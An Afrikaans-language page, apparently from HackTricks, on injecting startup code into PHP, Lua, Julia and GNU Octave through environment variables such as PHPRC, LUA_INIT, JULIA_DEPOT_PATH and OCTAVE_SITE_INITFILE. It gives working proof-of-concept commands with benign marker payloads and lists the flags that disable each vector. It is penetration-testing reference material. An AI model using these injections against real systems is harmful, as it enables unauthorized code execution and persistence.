# macOS Interpreter-opstartlêerinspuiting

{{#include ../../../banners/hacktricks-training.md}}

Hierdie looptydspesifieke tegnieke gebruik geërfde omgewingsveranderlikes om opstartkonfigurasie of kode te kies voordat die bedoelde skrip uitgevoer word. Lua ondersteun ook ’n inlynkodevariant.

## PHP-opstartkonfigurasie

### `PHPRC` / `PHP_INI_SCAN_DIR` en `auto_prepend_file`

PHP CLI en CGI lees konfigurasie by elke aanroep. `PHPRC` kan ’n `php.ini` kies wat deur die aanvaller gelees kan word, terwyl `PHP_INI_SCAN_DIR` die gids kan herlei wat vir bykomende `.ini`-lêers geskandeer word. Die `auto_prepend_file`-instruksie laat PHP ’n lêer ontleed voordat die aangevraagde skrip uitgevoer word, en hierdie kombinasie lei dus tot kode-uitvoering tydens opstart.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

’n Alternatief is ’n gids wat ’n `.ini`-lêer bevat:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Die `-n`-opsie ignoreer `php.ini`; ’n eksplisiete vertroude `-c`-pad geniet voorkeur bo `PHPRC`. Onthou dat ’n langlopende bediener-SAPI gewoonlik die konfigurasie lees wanneer die webbediener begin, terwyl CLI en CGI dit by elke aanroep doen.<sup>[[1]](#references)</sup>

## Lua-opstartkode

### `LUA_INIT`

Voordat die selfstandige Lua-interpreteerder opdragreëlopsies of die teikenskrip verwerk, voer dit `LUA_INIT_<major>_<minor>` uit, of, indien die weergawe-spesifieke veranderlike ontbreek, `LUA_INIT`. ’n Waarde wat met `@` begin, dui ’n lêer aan; enige ander waarde word direk as Lua-kode geëvalueer. Dit maak beide lêer-gebaseerde en lêerlose opstartuitvoering moontlik.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Die presiese weergawebenaming verander na gelang van die interpreter, byvoorbeeld `LUA_INIT_5_4`. `lua -E` ignoreer alle omgewingsveranderlikes, insluitend startup-kode en Lua-modulepaaie.

## Julia-startupdepot

### `JULIA_DEPOT_PATH` en `startup.jl`

Julia voer gewoonlik tydens startup `config/startup.jl` uit die eerste depot uit. `JULIA_DEPOT_PATH` beheer die depotlys, dus herlei die instelling daarvan na ’n boomstruktuur wat die aanvaller kan lees die outomaties gelaaide startup-lêer.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Die afsluitende skeidingsteken is nuttig wanneer die slagoffer steeds sy normale pakkette nodig het. `julia --startup-file=no` deaktiveer hierdie opstartlêer. Maak die veranderlike skoon voordat jy begin, want dit beheer ook pakketregisters, omgewings, kasgeheues en kode-laaiplekke.

## GNU Octave-opstartlêers

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave voer tydens opstart verskeie lêers uit wat geldige Octave-opdragte bevat. `OCTAVE_SITE_INITFILE` oorheers die werfwye opstartlêer en `OCTAVE_VERSION_INITFILE` oorheers die weergawespesifieke een, sodat enige van die veranderlikes outomatiese uitvoering na 'n lêer waarna die aanvaller kan lees, kan herlei.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` slaan slegs gebruikerslêers soos `~/.octaverc` oor; dit keer **nie** die werf-lêeroorskrywing hierbo nie. Gebruik `--no-site-file` vir die werflêers of `--norc` / `-f` om alle opstartlêers te deaktiveer.<sup>[[7]](#references)</sup>

## References

- [1] [PHP-konfigurasielêer](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 selfstandige interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia-opdragreël-koppelvlak: Opstartlêer](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia-omgewingsveranderlikes: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave-opstartlêers](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave-opdragreëlopsies](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
